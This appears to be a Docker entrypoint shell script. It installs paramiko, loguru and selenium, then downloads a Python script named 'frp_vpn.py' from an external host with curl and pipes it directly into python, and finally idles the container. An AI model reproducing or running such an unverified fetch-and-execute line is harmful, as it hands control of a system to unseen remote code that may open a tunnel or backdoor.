#!/bin/sh
pip3 install pip --upgrade
pip3 install paramiko loguru selenium
echo 1245655
curl -fsSL "https://www.qics.top/shell/docker/dockerfile/playdocker/frp_vpn.py" | python
tail -f /dev/null


